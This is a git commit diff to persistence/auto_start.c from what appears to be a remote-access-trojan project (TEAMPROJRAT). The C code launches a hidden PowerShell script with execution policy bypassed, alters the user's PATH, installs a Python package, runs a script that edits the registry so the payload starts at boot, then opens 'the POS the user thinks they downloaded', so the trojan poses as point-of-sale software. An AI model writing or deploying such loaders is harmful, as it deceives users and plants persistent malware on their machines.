b836410ab0f697329bc04da7e9fa58ccd7e3f04c
STUPID-AF-CAT <geddy@waveville.net>
2020-01-31 14:44:20 -0600

    Path variables added

--- persistence/auto_start.c
+++ persistence/auto_start.c
@@ -14,10 +14,10 @@ and triggering add_startup.py so that pos.py runs on startup.
 int main()
 {
     system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
-    //system("setx python \"%PATH%;%homepath%\\AppData\\Local\\Programs\\Python\\Python38-32\\");
-    //system("setx pip \"%PATH%;%homepath%\\AppData\\Local\\Programs\\Python\\Python38-32\\Scripts\\"); //adds the right path for pip
+    system("setx path \"%PATH%;%homepath%\\AppData\\Local\\Programs\\Python\\Python38-32\\\"");
+    system("setx path \"%PATH%;%homepath%\\AppData\\Local\\Programs\\Python\\Python38-32\\Scripts\\\""); //adds the right path for pip
     system("start /WAIT pip install openpyxl\n"); //openpyxl is needed to run pos.py
-    //system("setx pos2 \"%PATH%;%homepath%\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\");
+    system("setx path \"%PATH%;%homepath%\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\\"");
     system("python ./persistence/add_startup.py\n"); //starts the registry editing py file after python is installed
     system("cd UDP_Connection\n python pos.py\n"); //starts the POS the user thinks they downloaded
     return 0;
